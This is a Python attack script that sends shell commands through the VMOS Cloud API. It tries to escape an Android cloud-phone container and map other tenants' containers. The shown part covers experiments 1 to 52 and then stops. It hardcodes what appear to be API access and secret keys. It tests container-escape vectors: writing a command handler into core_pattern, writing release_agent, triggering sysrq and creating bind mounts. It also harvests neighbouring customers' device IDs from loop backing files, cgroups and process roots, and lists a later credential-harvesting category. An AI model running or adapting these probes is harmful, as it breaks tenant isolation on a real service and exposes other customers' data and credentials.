#!/usr/bin/env python3
"""
VMOS Cloud — 100 Advanced Container Escape & Host Filesystem Neighbor Mapping Experiments

Objectives:
  1. Escape container via EXPIRED device (ATP6416I3JJRXL3V) — confirmed still shell-accessible
  2. Map ALL neighbor containers via HOST FILESYSTEM (not IP scanning)
     - /proc/*/cgroup, /proc/*/cmdline, /proc/*/mountinfo
     - /sys/fs/cgroup/ hierarchies
     - /dev/loop* block devices → overlay mounts
     - Namespace enumeration via /proc/*/ns/
  3. 100 advanced experiments across 10 categories

Categories (10 experiments each):
  Cat A (1-10):   Container Escape Vector Probing
  Cat B (11-20):  Host Filesystem Neighbor Discovery
  Cat C (21-30):  Process & PID Namespace Mapping
  Cat D (31-40):  Cgroup Hierarchy Traversal
  Cat E (41-50):  Mount Namespace & Overlay Analysis
  Cat F (51-60):  Block Device & Loop Mount Enumeration
  Cat G (61-70):  Kernel & /sys Probing
  Cat H (71-80):  Network Namespace & Interface Mapping
  Cat I (81-90):  Credential & Data Harvesting from Neighbors
  Cat J (91-100): Advanced Escape Chains & Persistence
"""

import asyncio
import json
import os
import sys
import time
import re
from datetime import datetime, timezone
from collections import defaultdict

sys.path.insert(0, os.path.dirname(__file__))
from vmos_titan.core.vmos_cloud_api import VMOSCloudClient

AK = "BPWNWxfXMQsjsREyzIOXmCtndRZO8iVi"
SK = "Q2SgcSwEfuwoedY0cijp6Mce"
BASE = "https://api.vmoscloud.com"

DELAY = 3.5  # Rate limit spacing
# Use EXPIRED device as primary escape target; ACTIVE as secondary
EXPIRED = "ATP6416I3JJRXL3V"
ACTIVE = "APP6476KYH9KMLU5"

OUTPUT_FILE = "escape_100_results.json"

# ─── Shell helper ───────────────────────────────────────────────────────────
async def shell(client, pad, cmd, label="", timeout_sec=30):
    """Execute shell command and return parsed stdout."""
    try:
        resp = await client.sync_cmd(pad_code=pad, command=cmd, timeout_sec=timeout_sec)
        code = resp.get("code", -1)
        data = resp.get("data", [])
        stdout = ""
        if isinstance(data, list) and len(data) > 0:
            entry = data[0]
            if isinstance(entry, dict):
                stdout = entry.get("errorMsg", "") or entry.get("taskResult", "")
        elif isinstance(data, str):
            stdout = data
        return {"label": label, "status": code, "stdout": stdout.strip(), "cmd": cmd}
    except Exception as e:
        return {"label": label, "status": -1, "stdout": f"ERROR: {e}", "cmd": cmd}


# ─── Experiment runner ──────────────────────────────────────────────────────
class ExperimentRunner:
    def __init__(self):
        self.client = None
        self.results = {}
        self.neighbors_found = []
        self.experiment_count = 0

    async def init(self):
        self.client = VMOSCloudClient(ak=AK, sk=SK, base_url=BASE)

    def record(self, exp_id, category, title, result):
        self.results[exp_id] = {
            "id": exp_id,
            "category": category,
            "title": title,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "result": result
        }
        status_icon = "✓" if result.get("status") == 3 or "SUCCESS" in str(result.get("finding", "")) else "•"
        print(f"    [{status_icon}] EXP-{exp_id:03d}: {title}")
        if result.get("finding"):
            # Truncate very long findings for console
            finding = str(result["finding"])
            if len(finding) > 200:
                finding = finding[:200] + "..."
            print(f"         → {finding}")

    async def run_all(self):
        await self.init()
        print("=" * 100)
        print("  100 ADVANCED CONTAINER ESCAPE & HOST FILESYSTEM NEIGHBOR MAPPING EXPERIMENTS")
        print(f"  Primary: {EXPIRED} (expired) | Secondary: {ACTIVE} (active)")
        print("=" * 100)

        # Verify expired device is still alive
        print("\n  [PRE-FLIGHT] Verifying expired device responds...")
        r = await shell(self.client, EXPIRED, "id && echo ALIVE", "preflight")
        await asyncio.sleep(DELAY)
        if "ALIVE" in r["stdout"]:
            print(f"  ✓ Expired device {EXPIRED} is ALIVE — proceeding with 100 experiments\n")
        else:
            print(f"  ✗ Expired device not responsive: {r['stdout'][:100]}")
            print(f"  Falling back to active device {ACTIVE}\n")

        await self.cat_a_escape_vectors()
        await self.cat_b_host_filesystem_neighbors()
        await self.cat_c_process_pid_mapping()
        await self.cat_d_cgroup_traversal()
        await self.cat_e_mount_namespace()
        await self.cat_f_block_device_loop()
        await self.cat_g_kernel_sys_probing()
        await self.cat_h_network_namespace()
        await self.cat_i_credential_harvest()
        await self.cat_j_advanced_chains()

        await self.final_report()

    # ═══════════════════════════════════════════════════════════════════════
    # CATEGORY A: Container Escape Vector Probing (Exp 1-10)
    # ═══════════════════════════════════════════════════════════════════════
    async def cat_a_escape_vectors(self):
        print("\n" + "─" * 100)
        print("  CATEGORY A: Container Escape Vector Probing (EXP 1-10)")
        print("─" * 100)
        pad = EXPIRED

        # EXP-001: sysrq-trigger write test
        r = await shell(self.client, pad,
            "echo h > /proc/sysrq-trigger 2>&1 && echo 'SYSRQ_WRITABLE' || echo 'SYSRQ_BLOCKED'",
            "sysrq_write")
        self.record(1, "A", "sysrq-trigger write access", {
            **r, "finding": "WRITABLE" if "WRITABLE" in r["stdout"] else "BLOCKED"
        })
        await asyncio.sleep(DELAY)

        # EXP-002: core_pattern write test
        r = await shell(self.client, pad,
            "cat /proc/sys/kernel/core_pattern && echo '---' && "
            "echo '|/tmp/core_handler %p %s' > /proc/sys/kernel/core_pattern 2>&1 && "
            "cat /proc/sys/kernel/core_pattern",
            "core_pattern")
        self.record(2, "A", "core_pattern write & arbitrary command injection", {
            **r, "finding": "WRITABLE — can inject arbitrary command via core dump handler"
                if "core_handler" in r["stdout"] else "BLOCKED"
        })
        await asyncio.sleep(DELAY)

        # EXP-003: /proc/self/ns/ namespace isolation check
        r = await shell(self.client, pad,
            "ls -la /proc/self/ns/ 2>/dev/null | head -20",
            "ns_check")
        self.record(3, "A", "Namespace isolation enumeration", {
            **r, "finding": f"Namespaces visible: {r['stdout'].count('ns/')}"
        })
        await asyncio.sleep(DELAY)

        # EXP-004: CAP_SYS_ADMIN check
        r = await shell(self.client, pad,
            "cat /proc/self/status | grep -i cap 2>/dev/null",
            "capabilities")
        self.record(4, "A", "Capability set enumeration (CAP_SYS_ADMIN)", {
            **r, "finding": "Elevated capabilities detected" if r["stdout"] else "No caps readable"
        })
        await asyncio.sleep(DELAY)

        # EXP-005: /proc/1/cgroup — container cgroup root
        r = await shell(self.client, pad,
            "cat /proc/1/cgroup 2>/dev/null",
            "cgroup_root")
        self.record(5, "A", "Container cgroup root identification", {
            **r, "finding": r["stdout"][:200] if r["stdout"] else "NOT READABLE"
        })
        await asyncio.sleep(DELAY)

        # EXP-006: seccomp status
        r = await shell(self.client, pad,
            "cat /proc/self/status | grep -i seccomp 2>/dev/null && "
            "cat /proc/self/status | grep -i 'no_new_privs' 2>/dev/null",
            "seccomp")
        self.record(6, "A", "Seccomp profile status", {
            **r, "finding": "Seccomp DISABLED" if "0" in r["stdout"] else f"Seccomp state: {r['stdout'][:100]}"
        })
        await asyncio.sleep(DELAY)

        # EXP-007: SELinux enforcement status
        r = await shell(self.client, pad,
            "getenforce 2>/dev/null; cat /sys/fs/selinux/enforce 2>/dev/null; "
            "cat /proc/self/attr/current 2>/dev/null",
            "selinux")
        self.record(7, "A", "SELinux enforcement & context", {
            **r, "finding": r["stdout"][:200]
        })
        await asyncio.sleep(DELAY)

        # EXP-008: Docker/container socket access
        r = await shell(self.client, pad,
            "ls -la /var/run/docker.sock 2>/dev/null; "
            "ls -la /run/containerd/containerd.sock 2>/dev/null; "
            "ls -la /var/run/crio/crio.sock 2>/dev/null; "
            "ls -la /.dockerenv 2>/dev/null; "
            "cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | grep -i 'container\\|docker\\|redroid' | head -5",
            "container_runtime")
        self.record(8, "A", "Container runtime socket & env detection", {
            **r, "finding": r["stdout"][:300] if r["stdout"] else "No container sockets found"
        })
        await asyncio.sleep(DELAY)

        # EXP-009: AppArmor profile check
        r = await shell(self.client, pad,
            "cat /proc/self/attr/apparmor/current 2>/dev/null; "
            "cat /proc/1/attr/current 2>/dev/null; "
            "cat /sys/kernel/security/apparmor/profiles 2>/dev/null | head -10",
            "apparmor")
        self.record(9, "A", "AppArmor profile detection", {
            **r, "finding": r["stdout"][:200] if r["stdout"] else "AppArmor not detected"
        })
        await asyncio.sleep(DELAY)

        # EXP-010: Kernel module loading test
        r = await shell(self.client, pad,
            "cat /proc/modules 2>/dev/null | wc -l; "
            "cat /proc/modules 2>/dev/null | head -20; "
            "ls /lib/modules/ 2>/dev/null; "
            "ls /vendor/lib/modules/ 2>/dev/null | head -10",
            "kmod")
        self.record(10, "A", "Kernel module enumeration & loading capability", {
            **r, "finding": r["stdout"][:300] if r["stdout"] else "Modules not readable"
        })
        await asyncio.sleep(DELAY)

    # ═══════════════════════════════════════════════════════════════════════
    # CATEGORY B: Host Filesystem Neighbor Discovery (Exp 11-20)
    # ═══════════════════════════════════════════════════════════════════════
    async def cat_b_host_filesystem_neighbors(self):
        print("\n" + "─" * 100)
        print("  CATEGORY B: Host Filesystem Neighbor Discovery (EXP 11-20)")
        print("─" * 100)
        pad = EXPIRED

        # EXP-011: Enumerate ALL cgroup paths to find sibling containers
        r = await shell(self.client, pad,
            "find /sys/fs/cgroup/ -maxdepth 3 -type d 2>/dev/null | head -80",
            "cgroup_siblings")
        self.record(11, "B", "Cgroup hierarchy — find sibling container cgroups", {
            **r, "finding": f"Cgroup dirs found: {r['stdout'].count(chr(10))+1}" if r["stdout"] else "NO ACCESS"
        })
        await asyncio.sleep(DELAY)

        # EXP-012: /proc/*/cgroup — enumerate ALL PIDs' cgroups for neighbor IDs
        r = await shell(self.client, pad,
            "for p in $(ls -d /proc/[0-9]* 2>/dev/null | head -100); do "
            "  pid=$(basename $p); "
            "  cg=$(cat $p/cgroup 2>/dev/null | head -1); "
            "  [ -n \"$cg\" ] && echo \"PID=$pid CG=$cg\"; "
            "done | sort -u | head -60",
            "pid_cgroups")
        neighbor_ids = set()
        for line in r["stdout"].split("\n"):
            # Look for container IDs in cgroup paths
            for match in re.findall(r'[A-Z]{3}[A-Z0-9]{10,}', line):
                neighbor_ids.add(match)
        self.neighbors_found.extend(neighbor_ids)
        self.record(12, "B", "PID→cgroup mapping — extract neighbor container IDs", {
            **r, "finding": f"Unique container IDs in cgroups: {list(neighbor_ids)[:20]}"
        })
        await asyncio.sleep(DELAY)

        # EXP-013: /proc/*/mountinfo — find bind mounts revealing neighbor filesystems
        r = await shell(self.client, pad,
            "cat /proc/self/mountinfo 2>/dev/null | grep -v '\\bproc\\b\\|\\bsys\\b\\|\\btmpfs\\b' | head -40",
            "mountinfo_neighbors")
        self.record(13, "B", "Mountinfo analysis — neighbor filesystem bind mounts", {
            **r, "finding": r["stdout"][:400] if r["stdout"] else "NO ACCESS"
        })
        await asyncio.sleep(DELAY)

        # EXP-014: /proc/partitions — enumerate ALL block devices (find neighbor loop mounts)
        r = await shell(self.client, pad,
            "cat /proc/partitions 2>/dev/null",
            "partitions")
        loop_count = r["stdout"].count("loop") if r["stdout"] else 0
        self.record(14, "B", "/proc/partitions — loop device enumeration", {
            **r, "finding": f"Loop devices detected: {loop_count} (each may be a neighbor container)"
        })
        await asyncio.sleep(DELAY)

        # EXP-015: /dev/block/ — block device symlinks
        r = await shell(self.client, pad,
            "ls -la /dev/block/ 2>/dev/null | head -60",
            "dev_block")
        self.record(15, "B", "/dev/block/ symlinks — map all block devices", {
            **r, "finding": f"Block devices: {r['stdout'].count(chr(10))+1}" if r["stdout"] else "NO ACCESS"
        })
        await asyncio.sleep(DELAY)

        # EXP-016: Loop device backing files — reveals neighbor container images
        r = await shell(self.client, pad,
            "for lo in /dev/loop*; do "
            "  [ -b \"$lo\" ] || continue; "
            "  name=$(basename $lo); "
            "  back=$(cat /sys/block/$name/loop/backing_file 2>/dev/null); "
            "  size=$(cat /sys/block/$name/size 2>/dev/null); "
            "  [ -n \"$back\" ] && echo \"$name → $back (sectors=$size)\"; "
            "done | head -40",
            "loop_backing")
        # Extract pad codes from backing file paths
        for match in re.findall(r'[A-Z]{3}[A-Z0-9]{10,}', r["stdout"]):
            if match not in self.neighbors_found:
                self.neighbors_found.append(match)
        self.record(16, "B", "Loop device backing files — neighbor container images", {
            **r, "finding": r["stdout"][:400] if r["stdout"] else "NO LOOP BACKING INFO"
        })
        await asyncio.sleep(DELAY)

        # EXP-017: /proc/mounts — full mount table for overlay/ext4/f2fs neighbor FS
        r = await shell(self.client, pad,
            "cat /proc/mounts 2>/dev/null | grep -E 'loop|overlay|f2fs|ext4' | head -40",
            "mounts_fs")
        self.record(17, "B", "/proc/mounts — overlay/ext4/f2fs filesystem mounts", {
            **r, "finding": r["stdout"][:400] if r["stdout"] else "NO FS MOUNTS"
        })
        await asyncio.sleep(DELAY)

        # EXP-018: /sys/fs/ — enumerate all filesystem types in use
        r = await shell(self.client, pad,
            "ls -la /sys/fs/ 2>/dev/null; echo '---'; "
            "ls -la /sys/fs/cgroup/ 2>/dev/null | head -20; echo '---'; "
            "ls -la /sys/fs/f2fs/ 2>/dev/null; echo '---'; "
            "ls -la /sys/fs/ext4/ 2>/dev/null",
            "sysfs_enum")
        self.record(18, "B", "/sys/fs/ hierarchy — filesystem type enumeration", {
            **r, "finding": r["stdout"][:300] if r["stdout"] else "NO ACCESS"
        })
        await asyncio.sleep(DELAY)

        # EXP-019: /proc/*/cmdline — find neighbor container init processes
        r = await shell(self.client, pad,
            "for p in $(ls -d /proc/[0-9]* 2>/dev/null | head -200); do "
            "  pid=$(basename $p); "
            "  cmd=$(tr '\\0' ' ' < $p/cmdline 2>/dev/null | head -c 200); "
            "  [ -n \"$cmd\" ] && echo \"PID=$pid CMD=$cmd\"; "
            "done | grep -iE 'init|zygote|system_server|redroid|android|qemu|cuttlefish' | head -30",
            "neighbor_inits")
        self.record(19, "B", "Process cmdline — neighbor init/zygote/system_server", {
            **r, "finding": r["stdout"][:400] if r["stdout"] else "NO PROCESSES"
        })
        await asyncio.sleep(DELAY)

        # EXP-020: /proc/*/root — check if we can access neighbor root filesystems
        r = await shell(self.client, pad,
            "for p in $(ls -d /proc/[0-9]* 2>/dev/null | head -50); do "
            "  pid=$(basename $p); "
            "  root_link=$(readlink $p/root 2>/dev/null); "
            "  [ \"$root_link\" != \"/\" ] && echo \"PID=$pid ROOT=$root_link\"; "
            "done | head -20",
            "neighbor_roots")
        self.record(20, "B", "/proc/*/root — neighbor root filesystem pivot points", {
            **r, "finding": r["stdout"][:300] if r["stdout"] else "All PIDs have root=/"
        })
        await asyncio.sleep(DELAY)

    # ═══════════════════════════════════════════════════════════════════════
    # CATEGORY C: Process & PID Namespace Mapping (Exp 21-30)
    # ═══════════════════════════════════════════════════════════════════════
    async def cat_c_process_pid_mapping(self):
        print("\n" + "─" * 100)
        print("  CATEGORY C: Process & PID Namespace Mapping (EXP 21-30)")
        print("─" * 100)
        pad = EXPIRED

        # EXP-021: Full process tree — PID 1 ancestry
        r = await shell(self.client, pad,
            "cat /proc/1/status 2>/dev/null | head -15",
            "pid1_status")
        self.record(21, "C", "PID 1 status — container init identification", {
            **r, "finding": r["stdout"][:300]
        })
        await asyncio.sleep(DELAY)

        # EXP-022: PID namespace ID comparison
        r = await shell(self.client, pad,
            "readlink /proc/self/ns/pid 2>/dev/null; "
            "readlink /proc/1/ns/pid 2>/dev/null; "
            "readlink /proc/self/ns/pid_for_children 2>/dev/null",
            "pidns_id")
        self.record(22, "C", "PID namespace ID — are we in host or container PID ns?", {
            **r, "finding": r["stdout"][:200]
        })
        await asyncio.sleep(DELAY)

        # EXP-023: User namespace mapping
        r = await shell(self.client, pad,
            "cat /proc/self/uid_map 2>/dev/null; echo '---'; "
            "cat /proc/self/gid_map 2>/dev/null; echo '---'; "
            "readlink /proc/self/ns/user 2>/dev/null",
            "userns")
        self.record(23, "C", "User namespace UID/GID mapping", {
            **r, "finding": r["stdout"][:200]
        })
        await asyncio.sleep(DELAY)

        # EXP-024: /proc/[0-9]*/ns/pid — unique PID namespaces (= container count)
        r = await shell(self.client, pad,
            "for p in $(ls -d /proc/[0-9]* 2>/dev/null); do "
            "  readlink $p/ns/pid 2>/dev/null; "
            "done | sort -u",
            "unique_pidns")
        unique_ns = [x for x in r["stdout"].split("\n") if x.strip()] if r["stdout"] else []
        self.record(24, "C", "Unique PID namespaces — container count estimation", {
            **r, "finding": f"Unique PID namespaces: {len(unique_ns)} → ~{len(unique_ns)} containers"
        })
        await asyncio.sleep(DELAY)

        # EXP-025: /proc/[0-9]*/ns/* — full namespace comparison matrix
        r = await shell(self.client, pad,
            "for ns_type in pid mnt net uts ipc; do "
            "  count=$(for p in $(ls -d /proc/[0-9]* 2>/dev/null); do "
            "    readlink $p/ns/$ns_type 2>/dev/null; "
            "  done | sort -u | wc -l); "
            "  echo \"$ns_type: $count unique\"; "
            "done",
            "ns_matrix")
        self.record(25, "C", "Namespace isolation matrix (pid/mnt/net/uts/ipc)", {
            **r, "finding": r["stdout"][:200]
        })
        await asyncio.sleep(DELAY)

        # EXP-026: Process environment variables — container identity markers
        r = await shell(self.client, pad,
            "cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | head -30",
            "pid1_env")
        self.record(26, "C", "PID 1 environment — container identity markers", {
            **r, "finding": r["stdout"][:300]
        })
        await asyncio.sleep(DELAY)

        # EXP-027: /proc/self/cgroup vs /proc/1/cgroup — isolation depth
        r = await shell(self.client, pad,
            "echo '=== self ==='; cat /proc/self/cgroup 2>/dev/null; "
            "echo '=== PID 1 ==='; cat /proc/1/cgroup 2>/dev/null; "
            "echo '=== PID 2 ==='; cat /proc/2/cgroup 2>/dev/null",
            "cgroup_compare")
        self.record(27, "C", "Cgroup comparison (self vs PID 1 vs PID 2) — isolation depth", {
            **r, "finding": r["stdout"][:300]
        })
        await asyncio.sleep(DELAY)

        # EXP-028: Scheduler info — CPU pinning reveals host topology
        r = await shell(self.client, pad,
            "cat /proc/self/status | grep -i 'cpu\\|thread' 2>/dev/null; echo '---'; "
            "cat /sys/devices/system/cpu/online 2>/dev/null; echo '---'; "
            "cat /sys/devices/system/cpu/possible 2>/dev/null; echo '---'; "
            "cat /proc/stat | head -5 2>/dev/null",
            "cpu_topology")
        self.record(28, "C", "CPU topology — host core count & container pinning", {
            **r, "finding": r["stdout"][:300]
        })
        await asyncio.sleep(DELAY)

        # EXP-029: Memory info — host total vs container limit
        r = await shell(self.client, pad,
            "cat /proc/meminfo | head -10 2>/dev/null; echo '---'; "
            "cat /sys/fs/cgroup/memory/memory.limit_in_bytes 2>/dev/null; echo '---'; "
            "cat /sys/fs/cgroup/memory.max 2>/dev/null",
            "mem_info")
        self.record(29, "C", "Memory — host total vs container cgroup limit", {
            **r, "finding": r["stdout"][:300]
        })
        await asyncio.sleep(DELAY)

        # EXP-030: Process table — total PIDs visible (reveals container vs host view)
        r = await shell(self.client, pad,
            "ls -d /proc/[0-9]* 2>/dev/null | wc -l; echo '---'; "
            "ps -A 2>/dev/null | wc -l; echo '---'; "
            "cat /proc/sys/kernel/pid_max 2>/dev/null",
            "pid_count")
        self.record(30, "C", "Process count — container vs host process visibility", {
            **r, "finding": r["stdout"][:200]
        })
        await asyncio.sleep(DELAY)

    # ═══════════════════════════════════════════════════════════════════════
    # CATEGORY D: Cgroup Hierarchy Traversal (Exp 31-40)
    # ═══════════════════════════════════════════════════════════════════════
    async def cat_d_cgroup_traversal(self):
        print("\n" + "─" * 100)
        print("  CATEGORY D: Cgroup Hierarchy Traversal (EXP 31-40)")
        print("─" * 100)
        pad = EXPIRED

        # EXP-031: Cgroup version detection
        r = await shell(self.client, pad,
            "mount | grep cgroup; echo '---'; "
            "cat /proc/filesystems | grep cgroup 2>/dev/null; echo '---'; "
            "stat -f /sys/fs/cgroup/ 2>/dev/null",
            "cgroup_version")
        self.record(31, "D", "Cgroup version detection (v1 vs v2)", {
            **r, "finding": r["stdout"][:300]
        })
        await asyncio.sleep(DELAY)

        # EXP-032: Cgroup controllers available
        r = await shell(self.client, pad,
            "cat /sys/fs/cgroup/cgroup.controllers 2>/dev/null; echo '---'; "
            "ls /sys/fs/cgroup/ 2>/dev/null | head -30",
            "cgroup_controllers")
        self.record(32, "D", "Cgroup controllers enumeration", {
            **r, "finding": r["stdout"][:300]
        })
        await asyncio.sleep(DELAY)

        # EXP-033: Memory cgroup — current usage and limits
        r = await shell(self.client, pad,
            "cat /sys/fs/cgroup/memory.current 2>/dev/null; echo '---'; "
            "cat /sys/fs/cgroup/memory.max 2>/dev/null; echo '---'; "
            "cat /sys/fs/cgroup/memory.stat 2>/dev/null | head -10",
            "cgroup_memory")
        self.record(33, "D", "Memory cgroup — usage/limits/stats", {
            **r, "finding": r["stdout"][:300]
        })
        await asyncio.sleep(DELAY)

        # EXP-034: CPU cgroup — shares, quota, period
        r = await shell(self.client, pad,
            "cat /sys/fs/cgroup/cpu.max 2>/dev/null; echo '---'; "
            "cat /sys/fs/cgroup/cpu.stat 2>/dev/null; echo '---'; "
            "cat /sys/fs/cgroup/cpu.weight 2>/dev/null",
            "cgroup_cpu")
        self.record(34, "D", "CPU cgroup — max/stat/weight", {
            **r, "finding": r["stdout"][:200]
        })
        await asyncio.sleep(DELAY)

        # EXP-035: PIDs cgroup — max PIDs and current count
        r = await shell(self.client, pad,
            "cat /sys/fs/cgroup/pids.max 2>/dev/null; echo '---'; "
            "cat /sys/fs/cgroup/pids.current 2>/dev/null",
            "cgroup_pids")
        self.record(35, "D", "PIDs cgroup — max/current", {
            **r, "finding": r["stdout"][:100]
        })
        await asyncio.sleep(DELAY)

        # EXP-036: Cgroup parent traversal — climb UP the hierarchy
        r = await shell(self.client, pad,
            "cg=$(cat /proc/self/cgroup 2>/dev/null | head -1 | cut -d: -f3); "
            "echo \"Self cgroup: $cg\"; "
            "# Try to read parent cgroup\n"
            "parent_path=\"/sys/fs/cgroup${cg%/*}\"; "
            "echo \"Parent: $parent_path\"; "
            "ls $parent_path/ 2>/dev/null | head -20; echo '---'; "
            "# Grand-parent\n"
            "gp_path=\"${parent_path%/*}\"; "
            "echo \"Grandparent: $gp_path\"; "
            "ls $gp_path/ 2>/dev/null | head -20",
            "cgroup_climb")
        self.record(36, "D", "Cgroup parent traversal — climb hierarchy to host", {
            **r, "finding": r["stdout"][:400]
        })
        await asyncio.sleep(DELAY)

        # EXP-037: Cgroup subtree — find neighbor containers in same parent
        r = await shell(self.client, pad,
            "find /sys/fs/cgroup/ -name 'cgroup.procs' -maxdepth 4 2>/dev/null | head -30",
            "cgroup_subtree")
        self.record(37, "D", "Cgroup subtree — neighbor container cgroup.procs files", {
            **r, "finding": r["stdout"][:400]
        })
        await asyncio.sleep(DELAY)

        # EXP-038: Cgroup release_agent — escape via cgroup notify_on_release
        r = await shell(self.client, pad,
            "cat /sys/fs/cgroup/release_agent 2>/dev/null; echo '---'; "
            "cat /sys/fs/cgroup/notify_on_release 2>/dev/null; echo '---'; "
            "# Check if we can write release_agent\n"
            "echo test > /sys/fs/cgroup/release_agent 2>&1 || echo 'WRITE_BLOCKED'",
            "release_agent")
        self.record(38, "D", "Cgroup release_agent — classic escape vector", {
            **r, "finding": "WRITABLE" if "WRITE_BLOCKED" not in r["stdout"] else "BLOCKED — " + r["stdout"][:150]
        })
        await asyncio.sleep(DELAY)

        # EXP-039: Device cgroup — allowed device access
        r = await shell(self.client, pad,
            "cat /sys/fs/cgroup/devices.list 2>/dev/null; echo '---'; "
            "cat /sys/fs/cgroup/devices/devices.list 2>/dev/null; echo '---'; "
            "ls -la /dev/ 2>/dev/null | wc -l; echo '---'; "
            "ls -la /dev/loop* 2>/dev/null | head -10",
            "device_cgroup")
        self.record(39, "D", "Device cgroup — allowed device access list", {
            **r, "finding": r["stdout"][:300]
        })
        await asyncio.sleep(DELAY)

        # EXP-040: IO cgroup — read/write bandwidth limits
        r = await shell(self.client, pad,
            "cat /sys/fs/cgroup/io.max 2>/dev/null; echo '---'; "
            "cat /sys/fs/cgroup/io.stat 2>/dev/null | head -10",
            "cgroup_io")
        self.record(40, "D", "IO cgroup — bandwidth limits & stats", {
            **r, "finding": r["stdout"][:200]
        })
        await asyncio.sleep(DELAY)

    # ═══════════════════════════════════════════════════════════════════════
    # CATEGORY E: Mount Namespace & Overlay Analysis (Exp 41-50)
    # ═══════════════════════════════════════════════════════════════════════
    async def cat_e_mount_namespace(self):
        print("\n" + "─" * 100)
        print("  CATEGORY E: Mount Namespace & Overlay Analysis (EXP 41-50)")
        print("─" * 100)
        pad = EXPIRED

        # EXP-041: Full mount table
        r = await shell(self.client, pad,
            "cat /proc/mounts 2>/dev/null",
            "full_mounts")
        mount_count = r["stdout"].count("\n") + 1 if r["stdout"] else 0
        self.record(41, "E", "Full mount table enumeration", {
            **r, "finding": f"Total mounts: {mount_count}"
        })
        await asyncio.sleep(DELAY)

        # EXP-042: Overlay mounts — container filesystem layers
        r = await shell(self.client, pad,
            "cat /proc/mounts 2>/dev/null | grep overlay",
            "overlay_mounts")
        self.record(42, "E", "Overlay mounts — container layer analysis", {
            **r, "finding": r["stdout"][:400] if r["stdout"] else "NO OVERLAY MOUNTS"
        })
        await asyncio.sleep(DELAY)

        # EXP-043: /proc/self/mountinfo — propagation types (shared/slave/private)
        r = await shell(self.client, pad,
            "cat /proc/self/mountinfo 2>/dev/null | head -40",
            "mountinfo_full")
        shared = r["stdout"].count("shared:") if r["stdout"] else 0
        self.record(43, "E", "Mountinfo — propagation types (shared mounts = escape risk)", {
            **r, "finding": f"Shared mounts: {shared} (shared mounts enable escape via propagation)"
        })
        await asyncio.sleep(DELAY)

        # EXP-044: tmpfs mounts — in-memory filesystems
        r = await shell(self.client, pad,
            "cat /proc/mounts 2>/dev/null | grep tmpfs",
            "tmpfs")
        self.record(44, "E", "tmpfs mounts enumeration", {
            **r, "finding": r["stdout"][:300] if r["stdout"] else "NO TMPFS"
        })
        await asyncio.sleep(DELAY)

        # EXP-045: fdinfo — open file descriptors revealing host paths
        r = await shell(self.client, pad,
            "ls -la /proc/self/fd/ 2>/dev/null | head -30; echo '---'; "
            "ls -la /proc/1/fd/ 2>/dev/null | grep -v 'pipe\\|socket\\|anon' | head -20",
            "fdinfo")
        self.record(45, "E", "File descriptors — host path leakage via /proc/*/fd/", {
            **r, "finding": r["stdout"][:300]
        })
        await asyncio.sleep(DELAY)

        # EXP-046: mount propagation — can we create new bind mounts?
        r = await shell(self.client, pad,
            "mkdir -p /tmp/escape_test 2>/dev/null; "
            "mount --bind /proc /tmp/escape_test 2>&1; "
            "ls /tmp/escape_test/self/ns/ 2>/dev/null | head -5; "
            "umount /tmp/escape_test 2>/dev/null; "
            "echo 'BIND_MOUNT_TEST_DONE'",
            "bind_mount")
        self.record(46, "E", "Bind mount creation test — mount privilege check", {
            **r, "finding": "MOUNT CAPABLE" if "BIND_MOUNT_TEST_DONE" in r["stdout"]
                and "Permission denied" not in r["stdout"] else r["stdout"][:200]
        })
        await asyncio.sleep(DELAY)

        # EXP-047: System partition mount analysis
        r = await shell(self.client, pad,
            "cat /proc/mounts 2>/dev/null | grep -E '/system|/vendor|/product|/apex'",
            "system_mounts")
        self.record(47, "E", "System/vendor/product/apex mount analysis", {
            **r, "finding": r["stdout"][:300] if r["stdout"] else "NO SYSTEM MOUNTS"
        })
        await asyncio.sleep(DELAY)

        # EXP-048: /data mount — writable data partition analysis
        r = await shell(self.client, pad,
            "cat /proc/mounts 2>/dev/null | grep '/data'; echo '---'; "
            "df -h /data 2>/dev/null; echo '---'; "
            "ls -la /data/ 2>/dev/null | head -20",
            "data_mount")
        self.record(48, "E", "/data mount — writable partition analysis", {
            **r, "finding": r["stdout"][:300]
        })
        await asyncio.sleep(DELAY)

        # EXP-049: /dev mount — device file access
        r = await shell(self.client, pad,
            "ls -la /dev/ 2>/dev/null | head -50",
            "dev_tree")
        self.record(49, "E", "/dev device tree — accessible device files", {
            **r, "finding": f"Device files: {r['stdout'].count(chr(10))+1}" if r["stdout"] else "NO ACCESS"
        })
        await asyncio.sleep(DELAY)

        # EXP-050: Check for host filesystem access via /dev/sda* or /dev/vda*
        r = await shell(self.client, pad,
            "ls -la /dev/sd* /dev/vd* /dev/nvme* /dev/dm-* /dev/mapper/ 2>/dev/null; echo '---'; "
            "cat /proc/diskstats 2>/dev/null | head -20",
            "host_disk")
        self.record(50, "E", "Host disk devices — /dev/sd*/vd*/nvme* access", {
            **r, "finding": r["stdout"][:300] if r["stdout"] else "NO HOST DISK ACCESS"
        })
        await asyncio.sleep(DELAY)

    # ═══════════════════════════════════════════════════════════════════════
    # CATEGORY F: Block Device & Loop Mount Enumeration (Exp 51-60)
    # ═══════════════════════════════════════════════════════════════════════
    async def cat_f_block_device_loop(self):
        print("\n" + "─" * 100)
        print("  CATEGORY F: Block Device & Loop Mount Enumeration (EXP 51-60)")
        print("─" * 100)
        pad = EXPIRED

        # EXP-051: ALL loop devices with full metadata
        r = await shell(self.client, pad,
            "for lo in $(ls /sys/block/ 2>/dev/null | grep loop); do "
            "  back=$(cat /sys/block/$lo/loop/backing_file 2>/dev/null); "
            "  ro=$(cat /sys/block/$lo/ro 2>/dev/null); "
            "  size=$(cat /sys/block/$lo/size 2>/dev/null); "
            "  [ -n \"$back\" ] && echo \"$lo: back=$back ro=$ro sectors=$size\"; "
            "done",
            "all_loops")
        loop_count = r["stdout"].count("\n") + 1 if r["stdout"].strip() else 0
        # Extract neighbor pad codes from backing paths
        for match in re.findall(r'[A-Z]{3}[A-Z0-9]{10,}', r["stdout"]):
            if match not in self.neighbors_found:
                self.neighbors_found.append(match)
        self.record(51, "F", "ALL loop devices — backing files reveal neighbor containers", {
            **r, "finding": f"Loop devices with backing: {loop_count}, Neighbors: {len(self.neighbors_found)}"
        })
        await asyncio.sleep(DELAY)

        # EXP-052: /sys/block/ full enumeration
        r = await shell(self.client, pad,
            "ls -la /sys/block/ 2>/dev/null",
            "sys_block")
        self.record(52, "F", "/sys/block/ — all block devices visible to container", {
            **r, "finding": r["stdout"][:400]
        })
